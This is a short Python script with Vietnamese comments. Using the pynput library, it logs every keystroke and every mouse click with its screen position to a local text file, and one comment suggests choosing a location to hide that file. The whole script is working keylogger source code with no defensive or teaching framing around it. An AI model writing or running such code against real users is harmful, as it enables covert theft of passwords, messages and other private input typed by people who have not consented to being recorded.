from pynput import keyboard, mouse
import os

# Tên file để lưu dữ liệu
FILE_NAME = "data.txt" # Ghi địa chỉ nơi cần cất file càng tốt

cnt = 0

# Định nghĩa hàm để ghi dữ liệu vào file
def write_to_file(data):
    with open(FILE_NAME, "a") as f:
        f.write(data)

# Callback khi có sự kiện từ bàn phím
def on_press(key):
    global cnt
    try:
        write_to_file(str(key.char))
        cnt = 0
    except AttributeError:
        cnt += 1
        if cnt == 1:
            write_to_file("\n" + str(key))
        else:
            write_to_file(str(key))
        write_to_file("\n")


# Callback khi có sự kiện từ chuột
def on_click(x, y, button, pressed):
    if pressed:
        write_to_file(f"({x}, {y}):{button}" + "\n")

# Lắng nghe sự kiện từ bàn phím
with keyboard.Listener(on_press=on_press) as keyboard_listener:
    # Lắng nghe sự kiện từ chuột
    with mouse.Listener(on_click=on_click) as mouse_listener:
        # Chờ đợi kết thúc chương trình
        keyboard_listener.join()
        mouse_listener.join()